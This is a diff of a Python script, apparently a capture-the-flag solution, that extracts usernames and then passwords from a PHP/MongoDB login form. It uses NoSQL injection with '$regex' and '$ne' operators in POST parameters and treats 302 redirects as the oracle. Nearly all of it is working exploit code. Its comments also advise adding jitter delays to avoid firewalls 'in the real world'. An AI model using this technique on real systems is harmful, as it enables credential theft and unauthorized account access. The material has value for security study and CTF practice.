@@ -11,7 +11,8 @@ this will only work with nosql injection this is the perfect way to crack
 passwords if you've got nosql code injection working.
 
 This only works if they're no filtering input. Which I doubt they will be
-because *obviously* w/o sql you can't have sqlinjection thus you're safe from that class of attacks. I'm joking of course we no nosql injection to do which this script carrys out.
+because *obviously* w/o sql you can't have sqlinjection thus you're safe from that class of attacks.
+I'm joking of course we have no nosql injection to do which this script carrys out.
 
 """
 def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
@@ -36,9 +37,11 @@ def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
 	username_charset=""
 	print("Generating username Characterset")
 	'''
-	THE MESSAGE BELOW IS RELATED TO THE PASSWORD(MOSTLY) BUT THE KNOWLEDGE CONTAINED THEREIN APPLYS TO ANYTHING.
+	THE MESSAGE BELOW IS RELATED TO THE PASSWORD(MOSTLY) 
+	BUT THE KNOWLEDGE CONTAINED THEREIN APPLYS TO ANYTHING.
 
-	First we're going to go through our entire characterset looking for the characters in it. If we see it, then we'll add it to our list.
+	First we're going to go through our entire characterset looking for the characters in it.
+	If we see it, then we'll add it to our list.
 	This will reduce the time complexity from
 	O(82^n)
 	But because we're going through our characterset it then becomes just
@@ -61,7 +64,8 @@ def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
 	4) Receieve your reponses data.
 	5) Parse the response data.
 
-	So you're doing a full POST request for _every_ iteration. It's not just a simple loop and the time can be seen below the major increase in perf.
+	So you're doing a full POST request for _every_ iteration. 
+	It's not just a simple loop and the time can be seen below the major increase in perf.
 
 	This is for bruteforcing the password of the user mango.
 	#TODO: Do the benchmark figuring out the total number of guesses for the password for both methods.
@@ -75,25 +79,32 @@ def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
 	user	0m1.143s
 	sys	0m0.063s
 
-	Remember write fast code as it'll save you a ton of time. For this flag the two passwords by utilizing the faster version I was able to save
-	almost 5min of wall time. And this is with _zero_ delays in how fast I was connnecting to it. I was going full force as fast as possible.
-	In the real world to avoid resource exhaustion or being labeled as a DOS person you'd add some small jitter delay to your connection to avoid triggering the firewall.
-	So whereas I delayed it by 0ms you'd want to in the real world set the delay to ~50ms or more to reduce the amount of attacks you're doing at a time.
+	Remember write fast code as it'll save you a ton of time. 
+	For this flag the two passwords by utilizing the faster version I was able to save almost 5min of wall time. 
+	And this is with _zero_ delays in how fast I was connnecting to it. I was going full force as fast as possible.
+	In the real world to avoid resource exhaustion or being labeled as a DOS person you'd 
+	add some small jitter delay to your connection to avoid triggering the firewall. So whereas I delayed it by 0ms
+	 you'd want to in the real world set the delay to ~50ms or more to reduce the amount of attacks you're doing at a time.
 	You may still trigger the firewall but 20x second will make your attacks take way way way longer.
-	Of course both values should be realized as the worst-case scenario as you're very unlikely to go to the last character each time. But the ineffeciency can really add up.
+	Of course both values should be realized as the worst-case scenario as you're very unlikely to go to 
+	the last character each time. But the ineffeciency can really add up.
 	'''
-	#the first part will give us our users. This will eventually be a function.
-	#when creating the characterset we get each one seperately.
+	"""
+	the first part will give us our users. This will eventually be a function.
+	when creating the characterset we get each one seperately.
+	"""
 	for char in character_set:
-
-		#we need to setup the post data.
-		#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
-		#So we will run the pattern after recombining.
-		#in reality it'll be something like this.
-		#get(username:$regex => $regex_pattern
-		#thus we're looking for our regex pattern.
-		#first we're looking for the start. Then the current username escaped for regex special characters.
-		#then we're matching _any_ other characters. Set the login option to login.
+		"""
+		we need to setup the post data.
+		thanks to that guy we know that php will treat it as an array if it's within []. 
+		Plus we know that $regex is a special word that lets you search by some regex pattern.
+		So we will run the pattern after recombining.
+		in reality it'll be something like this.
+		get(username:$regex => $regex_pattern
+		thus we're looking for our regex pattern.
+		first we're looking for the start. Then the current username escaped for regex special characters.
+		then we're matching _any_ other characters. Set the login option to login.
+		"""
 		data={"username[$regex]": "[" + re.escape(char) +"]","login":"login","password[$ne]":"1"}
 		#request the data. Do not allow it to actually redirect us.
 		request_obj=requests.post(url,data=data,allow_redirects=False)
@@ -121,36 +132,30 @@ def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
 		username=first
 		begin_again=True
 		while begin_again:
-		#set it to false so that if we don't get any matches we're done. Something is broken or we've got the full username.
+			#set it to false so that if we don't get any matches we're done. Something is broken or we've got the full username.
 			begin_again=False
 			#get each character from the characterset individually.
 			for char in username_charset:
 				#our regex pattern is the previous username plus that 	character.
 				current_username=username+ char
-				#we need to setup the post data.
-				#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
-				#So we will run the pattern after recombining.
-				#in reality it'll be something like this.
-				#get(username:$regex => $regex_pattern
-				#thus we're looking for our regex pattern.
-				#first we're looking for the start. Then the current username escaped for regex special characters.
-			#then we're matching _any_ other characters. Set the login option to login.
+				#then we're matching _any_ other characters. Set the login option to login.
 				data={"username[$regex]": "^" + re.escape(current_username) +".*","login":"login","password[$ne]":"1"}
-			#request the data. Do not allow it to actually redirect us.
+				#request the data. Do not allow it to actually redirect us.
 				request_obj=requests.post(url,data=data,allow_redirects=False)
 				#302 means we're going to login since normally after logging in you're taken somewhere else.
 				if request_obj.status_code == 302:
-		#print our current pattern. This is just here to make it look like
-		#the natas flag I wrote previously.
+					#print our current pattern. This is just here to make it look like
+					#the natas flag I wrote previously.
+					#set the username to the current username that we just matched.					
 					username=current_username
 					print(current_username)
-				#begin again since we have a match.
+					#begin again since we have a match.
 					begin_again=True
-				#set the username to the current username that we just matched.
 
-				#break out of the for loop. And we go to the next loop again.
-				#this will set our username candidate to the current username
-				#and we'll start it again.
+					#break out of the for loop. And we go to the next loop again.
+					#this will set our username candidate to the current username
+					#and we'll start it again.
+					break
 
 		users.append(username)
 
@@ -163,24 +168,17 @@ def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
 		print("Generating {}'s password characterset.".format(user))
 		for char in character_set:
 
-		#we need to setup the post data.
-		#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
-		#So we will run the pattern after recombining.
-		#in reality it'll be something like this.
-		#get(password:$regex => $regex_pattern
-		#thus we're looking for our regex pattern.
-		#first we're looking for the start. Then the current password escaped for regex special characters.
-		#then we're matching _any_ other characters. Set the login option to login.
+			#we need to setup the post data.
 			data={"username":user,"password[$regex]": "[" + re.escape(char) +"]","login":"login"}
-		#request the data. Do not allow it to actually redirect us.
+			#request the data. Do not allow it to actually redirect us.
 			request_obj=requests.post(url,data=data,allow_redirects=False)
 
-		#302 means we're going to login since normally after logging in you're taken somewhere else.
+			#302 means we're going to login since normally after logging in you're taken somewhere else.
 			if request_obj.status_code == 302:
-		#since it matched we'll add it to our characterset.
+				#since it matched we'll add it to our characterset.
 				password_charset+=char
-	#print our current pattern. This is just here to make it look like
-	#the natas flag I wrote previously.
+				#print our current pattern. This is just here to make it look like
+				#the natas flag I wrote previously.
 				print(char)
 
 
@@ -188,37 +186,30 @@ def mongo_get_creds(url=None,usernames=None,character_set=None,jitter=None):
 		print("{}'s characterset {}".format(user,password_charset))
 		print("Guessing {}'s Password".format(user))
 		begin_again=True
-	#begin the mail loop where we loop through each character.
+		#begin the mail loop where we loop through each character.
 		while begin_again:
-	#set it to false so that if we don't get any matches we're done. Something is broken or we've got the full password.
+			#set it to false so that if we don't get any matches we're done. Something is broken or we've got the full password.
 			begin_again=False
-		#get each character from the characterset individually.
+			#get each character from the characterset individually.
 			for char in password_charset:
 			#our regex pattern is the previous password plus that character.
 				current_password=password+char
-			#we need to setup the post data.
-			#thanks to that guy we know that php will treat it as an array if it's within []. Plus we know that $regex is a special word that lets you search by some regex pattern.
-			#So we will run the pattern after recombining.
-			#in reality it'll be something like this.
-			#get(password:$regex => $regex_pattern
-			#thus we're looking for our regex pattern.
-			#first we're looking for the start. Then the current password escaped for regex special characters.
-			#then we're matching _any_ other characters. Set the login option to login.
+
 				data={"username":user,"password[$regex]": "^" + re.escape(current_password) +".*","login":"login"}
-			#request the data. Do not allow it to actually redirect us.
+				#request the data. Do not allow it to actually redirect us.
 				request_obj=requests.post(url,data=data,allow_redirects=False)
 				#302 means we're going to login since normally after logging in you're taken somewhere else.
 				if request_obj.status_code == 302:
-	#print our current pattern. This is just here to make it look like
-	#the natas flag I wrote previously.
+					#print our current pattern. This is just here to make it look like
+					#the natas flag I wrote previously.
 					print(current_password)
-				#begin again since we have a match.
+					#begin again since we have a match.
 					begin_again=True
-				#set the password to the current password that we just matched.
+					#set the password to the current password that we just matched.
 					password=current_password
-				#break out of the for loop. And we go to the next loop again.
-				#this will set our password candidate to the current password
-				#and we'll start it again.
+					#break out of the for loop. And we go to the next loop again.
+					#this will set our password candidate to the current password
+					#and we'll start it again.
 					break
 
 		print("username:{} \t password:{}".format(user,password))
